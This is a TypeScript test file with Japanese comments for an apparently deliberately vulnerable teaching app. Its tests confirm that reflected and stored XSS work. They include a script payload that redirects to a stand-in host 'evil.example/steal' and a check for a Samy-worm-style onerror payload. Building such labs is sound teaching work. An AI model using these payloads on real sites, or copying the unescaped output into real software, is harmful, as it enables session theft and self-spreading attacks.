// ============================================================================
// XSS (クロスサイトスクリプティング) モジュールのテスト
// ----------------------------------------------------------------------------
// 「脆弱であること」= 入力が無エスケープで HTML に出力されることを固定する。
// 対策(app.ts の escapeHtml を使って出力)を入れるとこれらは落ちる想定。
// 実在事例: 2005年 MySpace「Samy ワーム」(蓄積型XSSの自己増殖)。
// ============================================================================

import { describe, expect, it } from 'vitest';
import { app } from '../app';

describe('XSS - 反射型 (/sns/search)', () => {
  it('?q を無エスケープでそのまま反射する(脆弱)', async () => {
    const payload = '<script>alert(1)</script>';
    const res = await app.request(`/sns/search?q=${encodeURIComponent(payload)}`);
    expect(res.status).toBe(200);
    const html = await res.text();
    // 生の <script> がそのまま出る = ブラウザで実行される = 脆弱。
    expect(html).toContain(payload);
    // エスケープされていない(= &lt;script&gt; になっていない)ことを確認。
    expect(html).not.toContain('&lt;script&gt;');
  });
});

describe('XSS - 蓄積型 (/sns/users/:name)', () => {
  it('既定で攻撃者サミーのプロフィールに script 相当のペイロードが埋め込まれている', async () => {
    await app.request('/sns/profile/reset', { method: 'POST' });
    const res = await app.request('/sns/users/samy');
    expect(res.status).toBe(200);
    const html = await res.text();
    // onerror ハンドラ付き img(Samyワーム相当)が無エスケープで出ている。
    expect(html).toContain('onerror=');
    expect(html).toContain('/sns/like');
  });

  it('本人の『ひとこと』に入れた入力が無エスケープで保存・表示される(蓄積型XSS)', async () => {
    await app.request('/sns/profile/reset', { method: 'POST' });
    const payload = '<script>document.location="http://evil.example/steal"</script>';
    const post = await app.request('/sns/profile', {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ bio: payload }).toString(),
    });
    expect(post.status).toBe(200);

    const res = await app.request('/sns/users/you');
    const html = await res.text();
    expect(html).toContain(payload);
    expect(html).not.toContain('&lt;script&gt;');
  });

  it('存在しないユーザーは 404', async () => {
    const res = await app.request('/sns/users/no-such-user');
    expect(res.status).toBe(404);
  });

  it('/sns/profile/reset で既定プロフィールに戻る', async () => {
    await app.request('/sns/profile', {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ bio: '一時的な文' }).toString(),
    });
    await app.request('/sns/profile/reset', { method: 'POST' });
    const res = await app.request('/sns/users/you');
    const html = await res.text();
    expect(html).toContain('はじめまして');
  });
});
